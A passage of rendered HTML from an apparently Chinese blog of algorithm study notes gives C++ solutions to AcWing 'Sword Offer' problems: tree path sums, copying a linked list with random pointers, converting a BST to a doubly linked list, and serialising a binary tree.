class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res_;</span><br><span class="line">  </span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">findPath</span>(TreeNode* root, <span class="type">int</span> sum) &#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">    <span class="built_in">dfs</span>(root, sum, path);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root, <span class="type">int</span> sum, vector&lt;<span class="type">int</span>&gt; &amp;path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// if (!root &amp;&amp; !sum) res_.push_back(path);  // ä¸èƒ½æ”¾è¿™, å¶å­èŠ‚ç‚¹çš„2ä¸ªnullå„¿å­éƒ½ä¼šè§¦å‘</span></span><br><span class="line">    path.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    sum -= root-&gt;val;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!sum &amp;&amp; !root-&gt;left &amp;&amp; !root-&gt;right) res_.<span class="built_in">push_back</span>(path);</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left, sum, path);</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;right, sum, path);</span><br><span class="line">    </span><br><span class="line">    path.<span class="built_in">pop_back</span>();</span><br><span class="line">    sum += root-&gt;val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å¤æ‚é“¾è¡¨çš„å¤åˆ»â˜…"><a href="https://www.acwing.com/problem/content/89/">å¤æ‚é“¾è¡¨çš„å¤åˆ»â˜…</a></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°å¯ä»¥å¤åˆ¶ä¸€ä¸ªå¤æ‚é“¾è¡¨ã€‚</p><p>åœ¨å¤æ‚é“¾è¡¨ä¸­ï¼Œæ¯ä¸ªç»“ç‚¹é™¤äº†æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªç»“ç‚¹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„æŒ‡é’ˆæŒ‡å‘é“¾è¡¨ä¸­çš„ä»»æ„ç»“ç‚¹æˆ–è€…nullã€‚</p><p><strong>æ³¨æ„</strong>ï¼š</p><ul><li>å‡½æ•°ç»“æŸååŸé“¾è¡¨è¦ä¸è¾“å…¥æ—¶ä¿æŒä¸€è‡´ã€‚</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><h3 id="æ³•1-hashè¡¨æ³•-æ¨è">æ³•1 hashè¡¨æ³•(æ¨è)</h3><p>é—®é¢˜éš¾ç‚¹åœ¨äºrandomçš„å¤„ç†ï¼šè‹¥æœåˆ°æœ‰randomæ—¶å°±newä¸€ä¸ªå¯¹åº”èŠ‚ç‚¹ï¼Œåˆ™åç»­èŠ‚ç‚¹çš„nextå¯¹åº”åˆ°è¿™ä¸ªèŠ‚ç‚¹æ—¶ä¸å¥½å¤„ç†ï¼Œå› æ­¤å¯ä»¥ç”¨hashè¡¨ï¼Œä½¿å¾—ï¼š</p><p>å½“èŠ‚ç‚¹1çš„randomå’ŒèŠ‚ç‚¹2çš„nextå¯¹åº”èŠ‚ç‚¹ç›¸åŒæ—¶(keyç›¸åŒ)æ—¶ï¼Œæ–°é“¾è¡¨ä¸­å¯¹åº”çš„èŠ‚ç‚¹1â€™çš„randomå’ŒèŠ‚ç‚¹2â€™çš„nextå¯¹åº”çš„èŠ‚ç‚¹ä¹Ÿèƒ½ç›¸åŒ(valueç›¸åŒ)</p><blockquote><p>hashçš„æ˜¯<code>node</code> å’Œ <code>node-&gt;random</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list with a random pointer.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next, *random;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL), random(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode *<span class="title">copyRandomList</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;ListNode*, ListNode*&gt; hash;</span><br><span class="line">    hash[<span class="literal">nullptr</span>] = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">auto</span> dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>), cur = dummy;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">      <span class="comment">// hashçš„æ˜¯ head å’Œ head-&gt;random</span></span><br><span class="line">      <span class="keyword">if</span> (!hash.<span class="built_in">count</span>(head)) hash[head] = <span class="keyword">new</span> <span class="built_in">ListNode</span>(head-&gt;val);</span><br><span class="line">      <span class="keyword">if</span> (!hash.<span class="built_in">count</span>(head-&gt;random)) hash[head-&gt;random] = <span class="keyword">new</span> <span class="built_in">ListNode</span>(head-&gt;random-&gt;val);</span><br><span class="line">      </span><br><span class="line">      cur-&gt;next = hash[head];</span><br><span class="line">      cur-&gt;next-&gt;random = hash[head-&gt;random];</span><br><span class="line">      </span><br><span class="line">      head = head-&gt;next;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ³•2-å¹¶è¡Œé“¾è¡¨">æ³•2 å¹¶è¡Œé“¾è¡¨</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">copyRandomList</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 1. é“¾è¡¨æ‰€æœ‰èŠ‚ç‚¹ä¸­é—´éƒ½æ’å…¥ä¸€ä¸ªå¤åˆ¶èŠ‚ç‚¹ï¼Œä½œä¸ºå¹¶è¡Œé“¾è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> p = head; p; ) &#123;</span><br><span class="line">            ListNode* np = <span class="keyword">new</span> <span class="built_in">ListNode</span>(p-&gt;val);</span><br><span class="line">            np-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = np;</span><br><span class="line">            p = np-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. éå†æ–°é“¾è¡¨ï¼Œé‡åˆ°RandomèŠ‚ç‚¹åå¯¹åº”æ”¹å˜å¹¶è¡Œé“¾è¡¨ä¸­çš„èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> p = head; p; p = p-&gt;next-&gt;next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;random) &#123;</span><br><span class="line">                p-&gt;next-&gt;random = p-&gt;random-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. æå–å‡ºå¹¶è¡Œé“¾è¡¨</span></span><br><span class="line">        <span class="comment">// æ³¨æ„è¿™é‡Œè¦å®ç°çš„é“¾è¡¨çš„å¤åˆ»ï¼šåŸé“¾è¡¨åº”æ¢å¤ä¸ºåŸæ¥çš„ç»“æ„(å‰é¢å·²ç»ä¿®æ”¹äº†åŸé“¾è¡¨çš„ç»“æ„)</span></span><br><span class="line">        <span class="comment">// pæŒ‡å‘åŸé“¾è¡¨çš„èŠ‚ç‚¹, curæŒ‡å‘å¹¶è¡Œé“¾è¡¨çš„èŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">auto</span> dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>), cur = dummy;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> p = head; p; p = p-&gt;next) &#123;</span><br><span class="line">            cur-&gt;next = p-&gt;next;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">            p-&gt;next = p-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨â˜…"><a href="https://www.acwing.com/problem/content/87/">äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨â˜…</a></h2><p>è¾“å…¥ä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œå°†è¯¥äºŒå‰æœç´¢æ ‘è½¬æ¢æˆä¸€ä¸ªæ’åºçš„åŒå‘é“¾è¡¨ã€‚</p><p>è¦æ±‚ä¸èƒ½åˆ›å»ºä»»ä½•æ–°çš„ç»“ç‚¹ï¼Œåªèƒ½è°ƒæ•´æ ‘ä¸­ç»“ç‚¹æŒ‡é’ˆçš„æŒ‡å‘ã€‚</p><p><strong>æ³¨æ„</strong>ï¼š</p><ul><li>éœ€è¦è¿”å›åŒå‘é“¾è¡¨æœ€å·¦ä¾§çš„èŠ‚ç‚¹ã€‚</li></ul><p>ä¾‹å¦‚ï¼Œè¾“å…¥ä¸‹å›¾ä¸­å·¦è¾¹çš„äºŒå‰æœç´¢æ ‘ï¼Œåˆ™è¾“å‡ºå³è¾¹çš„æ’åºåŒå‘é“¾è¡¨ã€‚</p><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221218114850074.png" alt></p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><h3 id="æ³•1-ä¿®æ”¹çš„ä¸­åºä¼˜å…ˆéå†">æ³•1 ä¿®æ”¹çš„ä¸­åºä¼˜å…ˆéå†</h3><p>å°±åœ¨ä¸­åºé€’å½’éå†çš„åŸºç¡€ä¸Šæ”¹äº†ä¸€ç‚¹ç‚¹ï¼Œç”¨ä¸€ä¸ªpreæŒ‡é’ˆä¿å­˜ä¸­åºéå†çš„å‰ä¸€ä¸ªç»“ç‚¹ã€‚<br>å› ä¸ºæ˜¯ä¸­åºéå†ï¼Œéå†é¡ºåºå°±æ˜¯åŒçº¿é“¾è¡¨çš„å»ºç«‹é¡ºåºï¼›<br>æ¯ä¸€ä¸ªç»“ç‚¹è®¿é—®æ—¶å®ƒçš„å·¦å­æ ‘è‚¯å®šè¢«è®¿é—®è¿‡äº†ï¼Œæ‰€ä»¥æ”¾å¿ƒå¤§èƒ†çš„æ”¹å®ƒçš„leftæŒ‡é’ˆï¼Œä¸æ€•æ ‘æ–­æ‰ï¼›<br>åŒç†ï¼ŒpreæŒ‡å‘çš„ç»“ç‚¹ä¿å­˜çš„æ•°è‚¯å®šå°äºå½“å‰ç»“ç‚¹ï¼Œæ‰€ä»¥å…¶å·¦å³å­æ ‘è‚¯å®šéƒ½è®¿é—®è¿‡äº†ï¼Œæ‰€ä»¥å…¶rightæŒ‡é’ˆä¹Ÿå¯ä»¥ç›´æ¥æ”¹ã€‚</p><p>æœ€åéœ€è¦ä¸€ç›´å‘å·¦æ‰¾åˆ°åŒå‘é“¾è¡¨çš„å¤´ç»“ç‚¹ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  TreeNode* prev = <span class="literal">nullptr</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function">TreeNode* <span class="title">convert</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="keyword">while</span> (root &amp;&amp; root-&gt;left) root = root-&gt;left;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">    </span><br><span class="line">    root-&gt;left = prev;</span><br><span class="line">    <span class="keyword">if</span> (prev) prev-&gt;right = root;</span><br><span class="line">    prev = root;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-é€’å½’æ³•-2">æ³•2 é€’å½’æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">TreeNode* <span class="title">convert</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">auto</span> sides = <span class="built_in">dfs</span>(root);</span><br><span class="line">    <span class="keyword">return</span> sides.first;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">pair&lt;TreeNode*, TreeNode*&gt; <span class="title">dfs</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root-&gt;left &amp;&amp; !root-&gt;right) <span class="keyword">return</span> &#123;root, root&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root-&gt;left &amp;&amp; root-&gt;right) &#123;</span><br><span class="line">      <span class="keyword">auto</span> lsides = <span class="built_in">dfs</span>(root-&gt;left), rsides = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">      lsides.second-&gt;right = root, root-&gt;left = lsides.second;</span><br><span class="line">      rsides.first-&gt;left = root, root-&gt;right = rsides.first;</span><br><span class="line">      <span class="keyword">return</span> &#123;lsides.first, rsides.second&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">      <span class="keyword">auto</span> lsides = <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">      lsides.second-&gt;right = root, root-&gt;left = lsides.second;</span><br><span class="line">      <span class="keyword">return</span> &#123;lsides.first, root&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">      <span class="keyword">auto</span> rsides = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">      rsides.first-&gt;left = root, root-&gt;right = rsides.first;</span><br><span class="line">      <span class="keyword">return</span> &#123;root, rsides.second&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="åºåˆ—åŒ–äºŒå‰æ ‘â˜…â˜…"><a href="https://www.acwing.com/problem/content/46/">åºåˆ—åŒ–äºŒå‰æ ‘â˜…â˜…</a></h2><p>è¯·å®ç°ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«ç”¨æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–äºŒå‰æ ‘ã€‚</p><p>æ‚¨éœ€è¦ç¡®ä¿äºŒå‰æ ‘å¯ä»¥åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å¯ä»¥å°†æ­¤å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºåŸå§‹æ ‘ç»“æ„ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>ä½ å¯ä»¥åºåˆ—åŒ–å¦‚ä¸‹çš„äºŒå‰æ ‘    8   / \  12  2     / \    6   4ä¸ºï¼š&quot;[8, 12, 2, null, null, 6, 4, null, null, null, null]&quot;</code></pre><p><strong>æ³¨æ„</strong>:</p><ul><li>ä»¥ä¸Šçš„æ ¼å¼æ˜¯AcWingåºåˆ—åŒ–äºŒå‰æ ‘çš„æ–¹å¼ï¼Œä½ ä¸å¿…ä¸€å®šæŒ‰ç…§æ­¤æ ¼å¼ï¼Œæ‰€ä»¥å¯ä»¥è®¾è®¡å‡ºä¸€äº›æ–°çš„æ„é€ æ–¹å¼ã€‚</li></ul><h3 id="é¢˜è§£-4">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Encodes a tree to a single string.</span></span><br><span class="line">  <span class="function">string <span class="title">serialize</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    string res;</span><br><span class="line">    <span class="built_in">dfs_s</span>(root, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs_s</span><span class="params">(TreeNode *root, string &amp;s)</span> </span>&#123;  <span class="comment">// å¿…é¡»åŠ å¼•ç”¨</span></span><br><span class="line">    <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">      s += <span class="string">&quot;null &quot;</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s += <span class="built_in">to_string</span>(root-&gt;val) + <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="built_in">dfs_s</span>(root-&gt;left, s);</span><br><span class="line">    <span class="built_in">dfs_s</span>(root-&gt;right, s);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">  <span class="function">TreeNode* <span class="title">deserialize</span><span class="params">(string data)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> u = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">auto</span> root = <span class="built_in">dfs_d</span>(data, u);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">TreeNode *<span class="title">dfs_d</span><span class="params">(string &amp;data, <span class="type">int</span> &amp;u)</span> </span>&#123;  <span class="comment">// å¿…é¡»åŠ å¼•ç”¨</span></span><br><span class="line">    <span class="keyword">if</span> (u == data.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> k = u;</span><br><span class="line">    <span class="keyword">while</span> (data[k] != <span class="string">&#x27; &#x27;</span>) k++;  <span class="comment">// åªèƒ½ç”¨å•å¼•å·</span></span><br><span class="line">    <span class="keyword">if</span> (data[u] == <span class="string">&#x27;n&#x27;</span>) &#123;</span><br><span class="line">      u = k + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>, sign = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (data[u] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">      sign = <span class="number">-1</span>;</span><br><span class="line">      u++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = u; i &lt; k; i++)</span><br><span class="line">      num = <span class="number">10</span> * num + data[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    num = sign * num;</span><br><span class="line">    u = k + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">auto</span> root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(num);</span><br><span class="line">    root-&gt;left = <span class="built_in">dfs_d</span>(data, u);  <span class="comment">// åªæœ‰uæ˜¯å¼•ç”¨ï¼Œä¸èƒ½ä¼ å±€éƒ¨å˜é‡k + 1</span></span><br><span class="line">    root-&gt;right = <span class="built_in">dfs_d</span>(data, u);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>è‹¥ä¸ä½¿ç”¨å•å¼•å·ï¼ŒæŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Line <span class="number">40</span>: Char <span class="number">20</span>: warning: <span class="function">result of comparison against a string literal is <span class="title">unspecified</span> <span class="params">(use an 